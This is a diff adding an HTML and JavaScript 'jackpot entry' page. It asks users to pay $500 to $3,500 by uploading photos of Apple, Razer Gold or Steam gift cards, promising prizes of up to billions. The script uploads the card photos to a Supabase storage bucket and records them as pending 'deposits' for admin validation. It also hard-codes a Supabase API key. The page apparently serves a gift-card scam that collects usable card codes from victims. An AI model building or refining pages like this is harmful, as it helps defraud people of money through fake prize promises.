@@ -1,0 +1,683 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>PHC Entry</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+    <style>
+        .amount-list { display:flex; flex-direction:column; gap:12px; margin:20px 0; }
+        .amount {
+            background:#f1f5f9; padding:18px 20px; border-radius:18px; font-weight:700; cursor:pointer;
+            transition:0.3s; display:flex; justify-content:space-between; align-items:center;
+            border:2px solid transparent; position:relative;
+        }
+        body.dark .amount { background:#1a2a3a; color:#e8ecf1; }
+        .amount:hover { background:#004b87; color:white; transform:translateY(-2px); box-shadow:0 8px 25px rgba(0,75,135,0.15); }
+        body.dark .amount:hover { background:#004b87; }
+        .amount.selected { background:#004b87; color:white; border-color:#f5b342; box-shadow:0 0 0 3px rgba(245,179,66,0.3); }
+        .amount .entry-price { font-size:18px; }
+        .amount .prize-tag { background:rgba(245,179,66,0.15); color:#f5b342; padding:4px 14px; border-radius:20px; font-size:13px; font-weight:800; }
+        body.dark .amount .prize-tag { background:rgba(245,179,66,0.2); }
+        .amount.selected .prize-tag { background:rgba(255,255,255,0.2); color:#fff; }
+        .amount .card-icon { font-size:20px; margin-right:10px; }
+        .amount .entry-info { display:flex; align-items:center; gap:12px; }
+        .amount .entry-details { display:flex; flex-direction:column; gap:2px; }
+        .amount .entry-details .sub { font-size:11px; color:#7a8a9a; font-weight:500; }
+        body.dark .amount .entry-details .sub { color:#94a3b8; }
+        .amount.selected .entry-details .sub { color:rgba(255,255,255,0.7); }
+
+        .play-btn {
+            border:none; background:#004b87; color:white; padding:14px 28px; border-radius:30px;
+            font-weight:800; cursor:pointer; width:100%; font-size:16px; margin-top:10px; transition:0.3s;
+        }
+        .play-btn:hover { background:#003d70; transform:scale(1.01); }
+        .play-btn:disabled { opacity:0.6; cursor:not-allowed; transform:none; }
+
+        /* ========================================================== */
+        /* UPLOAD AREA                                                */
+        /* ========================================================== */
+        .upload-area {
+            border:2px dashed #dce5f0; border-radius:12px; padding:20px; text-align:center;
+            background:#f8fafc; margin:15px 0; transition:0.3s;
+            position:relative;
+        }
+        body.dark .upload-area { background:#1a2a3a; border-color:#2a4a6a; }
+        .upload-area:hover { background:#eef6ff; border-color:#004b87; }
+        body.dark .upload-area:hover { background:#1a2a4a; border-color:#f5b342; }
+
+        .upload-area .upload-icon { font-size:32px; color:#004b87; display:block; margin-bottom:6px; }
+        body.dark .upload-area .upload-icon { color:#f5b342; }
+        .upload-area .upload-hint { font-size:13px; color:#7a8a9a; }
+        body.dark .upload-area .upload-hint { color:#94a3b8; }
+        .upload-area .upload-hint small { display:block; font-size:11px; color:#aabbcc; margin-top:2px; }
+        body.dark .upload-area .upload-hint small { color:#6c7a8a; }
+
+        .upload-btn {
+            padding:10px 24px; border-radius:30px; border:none; font-weight:700; font-size:14px;
+            cursor:pointer; transition:0.3s; display:inline-flex; align-items:center; gap:8px;
+            margin:4px;
+        }
+        .upload-btn.camera { background:#004b87; color:white; }
+        .upload-btn.camera:hover { background:#003d70; transform:scale(1.02); }
+        .upload-btn.gallery { background:#1a237e; color:white; }
+        .upload-btn.gallery:hover { background:#0d1b4a; transform:scale(1.02); }
+        body.dark .upload-btn.camera { background:#f5b342; color:#0f172a; }
+        body.dark .upload-btn.gallery { background:#f59e0b; color:#0f172a; }
+
+        /* Photo Preview Grid */
+        .photo-preview-grid {
+            display:grid; grid-template-columns:repeat(4, 1fr); gap:8px; margin-top:12px;
+        }
+        .photo-preview-grid .photo-item {
+            position:relative; aspect-ratio:1/1; border-radius:8px; overflow:hidden;
+            border:2px solid rgba(255,215,0,0.2); background:#1a1a2e;
+        }
+        .photo-preview-grid .photo-item img {
+            width:100%; height:100%; object-fit:cover;
+        }
+        .photo-preview-grid .photo-item .remove-photo {
+            position:absolute; top:2px; right:2px; background:rgba(239,68,68,0.85);
+            color:white; border:none; border-radius:50%; width:20px; height:20px;
+            font-size:10px; cursor:pointer; display:flex; align-items:center; justify-content:center;
+            transition:0.2s; z-index:2;
+        }
+        .photo-preview-grid .photo-item .photo-number {
+            position:absolute; bottom:2px; left:2px; background:rgba(0,0,0,0.6);
+            color:white; font-size:8px; padding:1px 6px; border-radius:4px; z-index:2;
+        }
+        .photo-count-badge {
+            display:inline-block; background:#004b87; color:white; font-size:11px;
+            font-weight:700; padding:2px 12px; border-radius:12px; margin-top:6px;
+        }
+        body.dark .photo-count-badge { background:#f5b342; color:#0f172a; }
+
+        .toast {
+            position:fixed; bottom:100px; left:50%; transform:translateX(-50%);
+            background:#1a2a3a; color:white; padding:12px 24px; border-radius:14px; font-weight:600;
+            box-shadow:0 8px 30px rgba(0,0,0,0.3); opacity:0; transition:opacity 0.4s ease;
+            z-index:999; max-width:90%; text-align:center; pointer-events:none;
+        }
+        .toast.show { opacity:1; }
+
+        .success-box {
+            display:none; background:#e6f7e6; border:2px solid #1a8a4a; border-radius:16px;
+            padding:20px; margin-top:20px; text-align:center; animation:fadeIn 0.5s ease;
+        }
+        body.dark .success-box { background:#1a3a2a; border-color:#10b981; }
+        @keyframes fadeIn { from { opacity:0; transform:translateY(10px); } to { opacity:1; transform:translateY(0); } }
+        .success-box .icon { font-size:40px; color:#1a8a4a; display:block; margin-bottom:8px; }
+        body.dark .success-box .icon { color:#10b981; }
+        .success-box h3 { color:#1a8a4a; margin:0 0 4px 0; font-size:20px; }
+        body.dark .success-box h3 { color:#10b981; }
+        .success-box p { color:#3a5a6a; margin:0; font-size:14px; }
+        body.dark .success-box p { color:#94a3b8; }
+
+        .game-header { display:flex; align-items:center; gap:12px; margin-bottom:5px; }
+        .game-header .game-icon { font-size:32px; width:50px; height:50px; border-radius:14px; display:flex; align-items:center; justify-content:center; background:#e8f2ff; color:#004b87; }
+        body.dark .game-header .game-icon { background:#1a2a4a; color:#f5b342; }
+        .game-header .game-title { font-size:24px; font-weight:800; color:#0a1a2a; }
+        body.dark .game-header .game-title { color:#f8fafc; }
+        .game-header .game-title small { display:block; font-size:13px; font-weight:500; color:#7a8a9a; }
+        body.dark .game-header .game-title small { color:#94a3b8; }
+
+        .prize-highlight {
+            background:linear-gradient(135deg, #f5b342, #f59e0b); padding:12px 16px; border-radius:14px;
+            margin:10px 0 16px 0; display:flex; justify-content:space-between; align-items:center; color:#0a1a2a;
+        }
+        body.dark .prize-highlight { color:#f8fafc; }
+        .prize-highlight .label { font-size:13px; font-weight:600; }
+        .prize-highlight .value { font-size:20px; font-weight:900; }
+
+        .card { margin:0 16px 16px 16px; padding:20px; border-radius:12px; background:#ffffff; box-shadow:0 1px 4px rgba(0,0,0,0.06); border:1px solid #e8ecf1; }
+        body.dark .card { background:#1e293b; border-color:#334155; box-shadow:none; }
+        .card h2 { font-size:16px; font-weight:700; color:#212529; margin-bottom:8px; }
+        body.dark .card h2 { color:#f8fafc; }
+        .card p { font-size:13px; color:#6c757d; line-height:1.6; }
+        body.dark .card p { color:#94a3b8; }
+
+        .bottom-nav { position:fixed; bottom:0; left:50%; transform:translateX(-50%); width:100%; max-width:480px; background:#ffffff; display:flex; justify-content:space-around; align-items:center; padding:8px 0 14px 0; box-shadow:0 -2px 15px rgba(0,0,0,0.08); border-top:1px solid #e8ecf1; z-index:200; }
+        body.dark .bottom-nav { background:#0f172a; border-top-color:#1e293b; box-shadow:0 -2px 15px rgba(0,0,0,0.3); }
+        .nav-item { text-align:center; color:#6c757d; font-size:10px; font-weight:600; cursor:pointer; padding:4px 12px; transition:0.2s; border:none; background:transparent; text-decoration:none; }
+        body.dark .nav-item { color:#94a3b8; }
+        .nav-item i { display:block; font-size:20px; margin-bottom:2px; }
+        .nav-item.active { color:#1a237e; }
+        body.dark .nav-item.active { color:#f5b342; }
+
+        @media (max-width:480px) {
+            .game-header .game-icon { width:44px; height:44px; font-size:24px; }
+            .game-header .game-title { font-size:20px; }
+            .amount { padding:14px 16px; }
+            .amount .entry-price { font-size:16px; }
+            .card { padding:16px; }
+            .photo-preview-grid { grid-template-columns:repeat(3, 1fr); }
+            .upload-btn { padding:8px 16px; font-size:12px; }
+        }
+        @media (max-width:380px) {
+            .photo-preview-grid { grid-template-columns:repeat(2, 1fr); }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="app">
+
+        <div class="topbar">
+            <div class="logo">
+                <i class="fas fa-arrow-left" onclick="history.back()"></i>
+                Entry
+            </div>
+        </div>
+
+        <div class="welcome">
+            <div class="game-header">
+                <div class="game-icon" id="gameIcon">
+                    <i class="fab fa-apple"></i>
+                </div>
+                <div class="game-title" id="gameTitle">
+                    Apple Card Entry
+                    <small>Choose your entry level</small>
+                </div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="prize-highlight">
+                <span class="label">🏆 Jackpot Prize</span>
+                <span class="value" id="selectedPrizeDisplay">Up to 4.5 Billion</span>
+            </div>
+
+            <div class="amount-list" id="amountList">
+                <!-- Buttons generated by JavaScript -->
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>📸 Upload Card Photos</h2>
+            <p>Take photos with camera or select from gallery</p>
+
+            <div class="upload-area" id="uploadArea">
+                <i class="fas fa-camera upload-icon"></i>
+                <div class="upload-hint">
+                    Tap to add photos
+                    <small>📷 Camera • 🖼️ Gallery</small>
+                </div>
+
+                <div style="margin:8px 0;">
+                    <button class="upload-btn camera" onclick="openCamera()">
+                        <i class="fas fa-camera"></i> Take Photo
+                    </button>
+                    <button class="upload-btn gallery" onclick="openGallery()">
+                        <i class="fas fa-images"></i> Gallery
+                    </button>
+                </div>
+
+                <input type="file" id="cameraInput" accept="image/*" capture="environment" style="display:none;" />
+                <input type="file" id="galleryInput" accept="image/*" multiple style="display:none;" />
+
+                <div class="photo-preview-grid" id="photoPreviewGrid"></div>
+                <div id="photoCountBadge" class="photo-count-badge" style="display:none;">0 photos</div>
+            </div>
+
+            <button class="play-btn" id="submitBtn" onclick="submitEntry()">
+                <i class="fas fa-arrow-right"></i> Next
+            </button>
+
+            <div class="success-box" id="successBox">
+                <span class="icon">✅</span>
+                <h3>Successful!</h3>
+                <p id="successMessage">Your entry has been submitted. Please wait for admin validation.</p>
+            </div>
+        </div>
+
+        <div class="bottom-nav">
+            <div class="nav-item" onclick="location.href='index.html'"><i class="fas fa-home"></i> Home</div>
+            <div class="nav-item active"><i class="fas fa-trophy"></i> Jackpot</div>
+            <div class="nav-item" onclick="location.href='settings.html'"><i class="fas fa-gear"></i> Settings</div>
+        </div>
+
+    </div>
+
+    <div id="toast" class="toast">Message</div>
+
+    <script>
+        // ============================================================
+        // ✅ SUPABASE CONFIG
+        // ============================================================
+        const SUPABASE_URL = "https://gcesrhfyupmkrevaqpfr.supabase.co";
+        const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdjZXNyaGZ5dXBta3JldmFxcGZyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODI4MjQ0MjAsImV4cCI6MjA5ODQwMDQyMH0.LarBYjP0Eg4HfFV_x5GVS7K1d4AuRfBWOjo0D1kL2xM";
+
+        // ============================================================
+        // STATE
+        // ============================================================
+        var selectedAmount = 0;
+        var selectedCard = "";
+        var selectedPrize = 0;
+        var uploadedFiles = []; // Store File objects for upload
+        var uploadedPreviews = []; // Store preview URLs
+        var MAX_PHOTOS = 20;
+        var isSubmitting = false;
+
+        // ============================================================
+        // HELPERS
+        // ============================================================
+        function showToast(msg, duration) {
+            duration = duration || 3000;
+            var toast = document.getElementById('toast');
+            toast.textContent = msg;
+            toast.classList.add('show');
+            clearTimeout(toast._timer);
+            toast._timer = setTimeout(function() { toast.classList.remove('show'); }, duration);
+        }
+
+        function getCurrentUser() {
+            var localUser = JSON.parse(localStorage.getItem('phc_current_user'));
+            if (!localUser || !localUser.email) return null;
+            return localUser;
+        }
+
+        function formatCurrency(val) {
+            return val.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
+        }
+
+        // ============================================================
+        // ✅ UPLOAD TO SUPABASE STORAGE
+        // ============================================================
+        async function uploadToStorage(file, userId) {
+            try {
+                // Create unique filename
+                var timestamp = Date.now();
+                var randomId = Math.random().toString(36).substring(2, 8);
+                var fileName = userId + '/' + timestamp + '_' + randomId + '.jpg';
+
+                // Upload to Supabase Storage
+                var formData = new FormData();
+                formData.append('file', file);
+
+                var response = await fetch(`${SUPABASE_URL}/storage/v1/object/card-photos/${fileName}`, {
+                    method: 'POST',
+                    headers: {
+                        'apikey': SUPABASE_ANON_KEY,
+                        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
+                    },
+                    body: file
+                });
+
+                if (!response.ok) {
+                    var errorText = await response.text();
+                    console.error('Storage Upload Error:', errorText);
+                    return null;
+                }
+
+                // Get public URL
+                var publicUrl = `${SUPABASE_URL}/storage/v1/object/public/card-photos/${fileName}`;
+                return publicUrl;
+            } catch (e) {
+                console.error('Upload Error:', e);
+                return null;
+            }
+        }
+
+        // ============================================================
+        // ✅ SAVE TO SUPABASE DATABASE
+        // ============================================================
+        async function saveToSupabase(table, data) {
+            try {
+                var response = await fetch(`${SUPABASE_URL}/rest/v1/${table}`, {
+                    method: 'POST',
+                    headers: {
+                        'apikey': SUPABASE_ANON_KEY,
+                        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+                
+                if (!response.ok) {
+                    var errorText = await response.text();
+                    console.error('Supabase Error:', errorText);
+                    return false;
+                }
+                return true;
+            } catch (e) { 
+                console.error("Save Error:", e);
+                return false; 
+            }
+        }
+
+        // ============================================================
+        // PRIZE TABLE
+        // ============================================================
+        var prizeTable = {
+            'Apple Card': {
+                500: { prize: 100000000, label: '100 Million' },
+                1500: { prize: 2500000000, label: '2.5 Billion' },
+                2000: { prize: 4500000000, label: '4.5 Billion' },
+                3500: { prize: 4500000000, label: '4.5 Billion' }
+            },
+            'Razer Gold': {
+                500: { prize: 200000000, label: '200 Million' },
+                1500: { prize: 4000000000, label: '4 Billion' },
+                2000: { prize: 6000000000, label: '6 Billion' },
+                3500: { prize: 6000000000, label: '6 Billion' }
+            },
+            'Steam Card': {
+                500: { prize: 50000000, label: '50 Million' },
+                1500: { prize: 1000000000, label: '1 Billion' },
+                2000: { prize: 2000000000, label: '2 Billion' },
+                3500: { prize: 2000000000, label: '2 Billion' }
+            }
+        };
+
+        var cardIcons = {
+            'Apple Card': 'fab fa-apple',
+            'Razer Gold': 'fas fa-bolt',
+            'Steam Card': 'fab fa-steam'
+        };
+
+        var cardColors = {
+            'Apple Card': '#004b87',
+            'Razer Gold': '#00ff00',
+            'Steam Card': '#1b2838'
+        };
+
+        // ============================================================
+        // BUILD ENTRY BUTTONS
+        // ============================================================
+        function buildEntryButtons() {
+            var game = localStorage.getItem('selectedGame') || 'Apple Card';
+            var iconClass = cardIcons[game] || 'fab fa-apple';
+            var iconColor = cardColors[game] || '#004b87';
+
+            document.getElementById('gameIcon').innerHTML = '<i class="' + iconClass + '" style="color:' + iconColor + ';"></i>';
+            document.getElementById('gameTitle').innerHTML = game + ' Entry<small>Choose your entry level</small>';
+
+            var container = document.getElementById('amountList');
+            container.innerHTML = '';
+
+            var amounts = [500, 1500, 2000, 3500];
+            var cardData = prizeTable[game] || prizeTable['Apple Card'];
+
+            amounts.forEach(function(amount) {
+                var data = cardData[amount];
+                var prizeLabel = data ? data.label : '0';
+                var div = document.createElement('div');
+                div.className = 'amount';
+                div.onclick = function() { chooseAmount(this, amount, game, prizeLabel); };
+                div.innerHTML = `
+                    <div class="entry-info">
+                        <span class="card-icon"><i class="${iconClass}" style="color:${iconColor};"></i></span>
+                        <div class="entry-details">
+                            <span class="entry-price">$${formatCurrency(amount)}</span>
+                            <span class="sub">${game} Entry</span>
+                        </div>
+                    </div>
+                    <span class="prize-tag">🏆 Win ${prizeLabel}</span>
+                `;
+                container.appendChild(div);
+            });
+
+            var firstAmount = amounts[0];
+            var firstData = cardData[firstAmount];
+            document.getElementById('selectedPrizeDisplay').textContent = 'Up to ' + (firstData ? firstData.label : '0');
+        }
+
+        function chooseAmount(el, amount, card, prizeLabel) {
+            document.querySelectorAll('.amount').forEach(function(a) { a.classList.remove('selected'); });
+            el.classList.add('selected');
+            
+            selectedAmount = amount;
+            selectedCard = card;
+            selectedPrize = prizeTable[card][amount].prize;
+
+            localStorage.setItem('selectedAmount', '$' + amount);
+            localStorage.setItem('selectedCard', card);
+            localStorage.setItem('selectedPrize', selectedPrize);
+            localStorage.setItem('selectedPrizeLabel', prizeLabel);
+
+            document.getElementById('selectedPrizeDisplay').textContent = prizeLabel;
+            showToast('✅ Selected: $' + formatCurrency(amount) + ' ' + card + ' → Win ' + prizeLabel);
+        }
+
+        // ============================================================
+        // OPEN CAMERA / GALLERY
+        // ============================================================
+        function openCamera() {
+            document.getElementById('cameraInput').click();
+        }
+
+        function openGallery() {
+            document.getElementById('galleryInput').click();
+        }
+
+        // ============================================================
+        // ✅ HANDLE FILE SELECTION
+        // ============================================================
+        function handleFiles(files) {
+            if (files.length === 0) return;
+            
+            if (uploadedFiles.length + files.length > MAX_PHOTOS) {
+                showToast('⚠️ Maximum ' + MAX_PHOTOS + ' photos allowed.');
+                return;
+            }
+
+            for (var i = 0; i < files.length; i++) {
+                var file = files[i];
+                if (!file.type.startsWith('image/')) continue;
+                
+                uploadedFiles.push(file);
+                
+                // Create preview
+                var reader = new FileReader();
+                reader.onload = function(e) {
+                    uploadedPreviews.push(e.target.result);
+                    renderPhotoPreviews();
+                };
+                reader.readAsDataURL(file);
+            }
+
+            showToast('📸 ' + uploadedFiles.length + ' photo(s) uploaded');
+            
+            // Reset inputs
+            document.getElementById('cameraInput').value = '';
+            document.getElementById('galleryInput').value = '';
+        }
+
+        // Camera input
+        document.getElementById('cameraInput').addEventListener('change', function(e) {
+            handleFiles(this.files);
+        });
+
+        // Gallery input
+        document.getElementById('galleryInput').addEventListener('change', function(e) {
+            handleFiles(this.files);
+        });
+
+        // ============================================================
+        // RENDER PHOTO PREVIEWS
+        // ============================================================
+        function renderPhotoPreviews() {
+            var grid = document.getElementById('photoPreviewGrid');
+            var badge = document.getElementById('photoCountBadge');
+            
+            grid.innerHTML = '';
+            
+            if (uploadedPreviews.length === 0) {
+                badge.style.display = 'none';
+                return;
+            }
+            
+            badge.style.display = 'inline-block';
+            badge.textContent = uploadedPreviews.length + ' photo' + (uploadedPreviews.length > 1 ? 's' : '');
+            
+            uploadedPreviews.forEach(function(imgSrc, index) {
+                var div = document.createElement('div');
+                div.className = 'photo-item';
+                div.innerHTML = `
+                    <img src="${imgSrc}" alt="Card photo ${index + 1}" />
+                    <button class="remove-photo" onclick="removePhoto(${index})" title="Remove photo">✕</button>
+                    <span class="photo-number">#${index + 1}</span>
+                `;
+                grid.appendChild(div);
+            });
+        }
+
+        // ============================================================
+        // REMOVE PHOTO
+        // ============================================================
+        function removePhoto(index) {
+            uploadedFiles.splice(index, 1);
+            uploadedPreviews.splice(index, 1);
+            renderPhotoPreviews();
+            showToast('🗑️ Photo removed');
+        }
+
+        // ============================================================
+        // ✅ SUBMIT ENTRY - UPLOADS TO STORAGE THEN SAVES TO DB
+        // ============================================================
+        async function submitEntry() {
+            if (isSubmitting) return;
+            
+            var user = getCurrentUser();
+            if (!user) {
+                showToast('⚠️ Please login first.');
+                return;
+            }
+
+            if (!selectedAmount || selectedAmount <= 0) {
+                showToast('⚠️ Please select an entry level.');
+                return;
+            }
+
+            if (uploadedFiles.length === 0) {
+                showToast('⚠️ Please upload at least one card photo.');
+                return;
+            }
+
+            isSubmitting = true;
+            var btn = document.getElementById('submitBtn');
+            btn.textContent = '⏳ Submitting...';
+            btn.disabled = true;
+
+            try {
+                var successCount = 0;
+                var failedCount = 0;
+                
+                // Show progress
+                showToast('📤 Uploading ' + uploadedFiles.length + ' photos to cloud...');
+
+                for (var i = 0; i < uploadedFiles.length; i++) {
+                    try {
+                        // Step 1: Upload to Storage
+                        var file = uploadedFiles[i];
+                        var userId = user.email.split('@')[0];
+                        var imageUrl = await uploadToStorage(file, userId);
+
+                        if (imageUrl) {
+                            // Step 2: Save to Database
+                            var saved = await saveToSupabase('deposits', {
+                                user_email: user.email,
+                                user_name: user.firstName + ' ' + user.lastName,
+                                card_type: selectedCard,
+                                amount: selectedAmount,
+                                target_prize: selectedPrize,
+                                image_url: imageUrl,
+                                status: 'pending',
+                                photo_number: i + 1,
+                                total_photos: uploadedFiles.length
+                            });
+                            
+                            if (saved) {
+                                successCount++;
+                            } else {
+                                failedCount++;
+                            }
+                        } else {
+                            failedCount++;
+                        }
+                    } catch (err) {
+                        failedCount++;
+                        console.error('Photo ' + (i+1) + ' failed:', err);
+                    }
+                    
+                    // Update progress
+                    var progress = Math.round(((i + 1) / uploadedFiles.length) * 100);
+                    btn.textContent = '⏳ Uploading... ' + progress + '%';
+                }
+
+                // Show result
+                var btnElement = document.querySelector('.card:last-child .play-btn');
+                btnElement.style.display = 'none';
+                
+                var successBox = document.getElementById('successBox');
+                successBox.style.display = 'block';
+                
+                if (successCount > 0) {
+                    document.getElementById('successMessage').textContent = 
+                        '✅ ' + successCount + ' photo(s) uploaded for $' + selectedAmount.toFixed(2) + ' ' + selectedCard + ' entry.' + 
+                        (failedCount > 0 ? ' ⚠️ ' + failedCount + ' photo(s) failed. Please try again.' : ' Pending admin validation.');
+                    
+                    showToast('✅ ' + successCount + ' photo(s) uploaded successfully!');
+                    
+                    // Clear uploaded files
+                    uploadedFiles = [];
+                    uploadedPreviews = [];
+                    renderPhotoPreviews();
+
+                    setTimeout(function() {
+                        window.location.href = 'bet.html';
+                    }, 3000);
+                } else {
+                    document.getElementById('successMessage').textContent = 
+                        '❌ Failed to upload photos. Please try again.';
+                    showToast('❌ Failed to upload photos. Please try again.');
+                    btnElement.style.display = 'block';
+                    btn.textContent = '<i class="fas fa-arrow-right"></i> Next';
+                    btn.disabled = false;
+                    isSubmitting = false;
+                }
+
+            } catch (error) {
+                console.error('Submit Error:', error);
+                showToast('⚠️ Error submitting. Please try again.');
+                var btnElement = document.querySelector('.card:last-child .play-btn');
+                btnElement.style.display = 'block';
+                btn.textContent = '<i class="fas fa-arrow-right"></i> Next';
+                btn.disabled = false;
+                isSubmitting = false;
+            }
+        }
+
+        // ============================================================
+        // DARK MODE
+        // ============================================================
+        (function() {
+            if (localStorage.getItem("phc_dark_mode") === "true") {
+                document.body.classList.add("dark");
+            }
+        })();
+
+        // ============================================================
+        // INIT
+        // ============================================================
+        document.addEventListener('DOMContentLoaded', function() {
+            buildEntryButtons();
+            console.log('📸 Entry page loaded with Storage upload!');
+            console.log('✅ Connected to Supabase:', SUPABASE_URL);
+            console.log('✅ Storage bucket: card-photos');
+        });
+
+        // Make functions global
+        window.submitEntry = submitEntry;
+        window.removePhoto = removePhoto;
+        window.chooseAmount = chooseAmount;
+        window.openCamera = openCamera;
+        window.openGallery = openGallery;
+    </script>
+
+</body>
+</html>
